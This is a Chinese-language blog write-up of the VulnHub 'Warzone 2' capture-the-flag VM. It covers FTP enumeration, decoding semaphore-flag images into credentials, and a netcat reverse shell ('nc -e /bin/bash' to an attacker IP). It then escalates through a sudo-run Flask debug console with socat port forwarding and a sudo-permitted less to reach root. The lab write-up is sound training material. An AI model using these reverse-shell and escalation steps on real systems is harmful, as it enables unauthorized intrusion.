> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BKm6dWqtCBrjkUl-VOraaA)

**0x01** Introduction  

* * *

虚拟机下载页面：http://www.vulnhub.com/entry/warzone-2,598/  

Description

```
Enumeration, Flask, Port Forwarding, GTFObins

Created and Tested in Virtual box (NAT network)

Hint : lowercase letters
```

‍

**0x02 Writeup**  

#### 获取 shell

端口扫描结果：

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
1337/tcp open  tcpwrapped
```

使用 anonymous 登录 ftp 发现有 anon 目录，将其中的 username.PNG，password.PNG，token.PNG 下载到本地，发现是海军旗语 [1]。

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSF6SjFHakdNNCVE2OOeibPtVBs6MGVicrqEZd7dvNvyiciavqlZXL9CGDfv5EumNCibyTIXmUz1PmSCnw/640?wx_fmt=png)

用户名为 semaphore

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSF6SjFHakdNNCVE2OOeibPtJICsAiaOXOFYaojDRG0sdSZiaDdhneiawibcTohBVb2BjJJaWEvSlNzG7A/640?wx_fmt=png)

密码为 signalperson

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSF6SjFHakdNNCVE2OOeibPtJ7M4tOYSo5YwTnOeOZia4jyEzeqDsFYT1mOxgEjKibtE79oHC6ic1Q21A/640?wx_fmt=png)

在网站 http://www.jsons.cn/sha / 进行加密得到 token 为 833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26

nc 连接远程 1337 端口，成功获取 shell。

```
Username :semaphore
Password :signalperson
Token :833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26
Success Login
[SIGNALS] { ls, pwd, nc}
[semaphore] > nc -e /bin/bash 192.168.56.103 8000
[+] Recognized signal
[+] sending......

kali@kali:~$ nc -lvp 8000
listening on [any] 8000 ...
192.168.56.102: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 35628
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 获取 root

端口扫描结果：进入 flagman 的 warzone2-socket-server 目录，发现了用户密码文件. mysshpassword，得到密码 i_hate_signals!。

```
flagman@192.168.56.102's password: 
Linux warzone2 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64
+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+
WARZONE 2 WARZONE 2 WARZONE 2 WARZONE 2 WARZONE 2 WARZONE 2 WARZONE 2
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                    {WARZONE IS A DANGER ZONE}
flagman@warzone2:~$ 
```

查看 sudo -l 发现可以以用户 admiral 执行 / home/admiral/warzone2-app/wrz2-app.py。

```
flagman@warzone2:~$ sudo -l
Matching Defaults entries for flagman on warzone2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User flagman may run the following commands on warzone2:
    (admiral) NOPASSWD: /usr/bin/python3
        /home/admiral/warzone2-app/wrz2-app.py
flagman@warzone2:~$ ls -all /home/admiral/warzone2-app/wrz2-app.py
-r-x------ 1 admiral admiral 494 Nov  8 09:32 /home/admiral/warzo
```

该文件不能被用户 flagman 读取和编辑，于是直接运行。

```
flagman@warzone2:~$ sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py
 * Serving Flask app "wrz2-app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.                                               
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 193-235-657
```

程序在 5000 端口起了一个 flask，并且开启了 debug 和输出了 pin 码。下面在 debug 中获取反弹 shell[2]，成功获取用户 admiral 权限。由于监听在地址 127.0.0.1，这里使用 socat 做了一个端口转发。  

```
flagman@warzone2:~$ socat TCP4-LISTEN:15000,reuseaddr,fork TCP4:127.0.0.1:5000
```

访问 / console，成功反弹 shell。

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSF6SjFHakdNNCVE2OOeibPtAf4q3kToqV6z1WpPTZ4tQbbMz8icJ3mkLQNgibBTpI7hUFYrVEsicddIA/640?wx_fmt=png)

```
kali@kali:~$ rlwrap nc -lvp 8000
listening on [any] 8000 ...
192.168.56.102: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 56154
id
uid=1000(admiral) gid=1000(admiral) groups=1000(admiral),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),117(lpadmin),118(scanner)
sudo -l
Matching Defaults entries for admiral on warzone2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admiral may run the following commands on warzone2:
    (root) NOPASSWD: /usr/bin/less /var/public/warzone-rules.txt
python3 -c 'import pty;pty.spawn("/bin/bash")'
admiral@warzone2:/home/flagman$ 
```

使用 less[3] 获取 root 权限。

```
admiral@warzone2:~$                     sudo -u root /usr/bin/less /var/public/warzone-rules.txt
sudo -u root /usr/bin/less /var/public/warzone-rules.txt
root@warzone2:/home/admiral# 
```

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 SECARMY VILLAGE: GRAYHAT CONFERENCE 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487087&idx=1&sn=608b289cd49a502720777dd037c66406&chksm=fcfc3339cb8bba2f4c7d17fc13fc9fc7168fb90ee2d7ea81a94918d92e8e309fc3a2f3e247b3&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**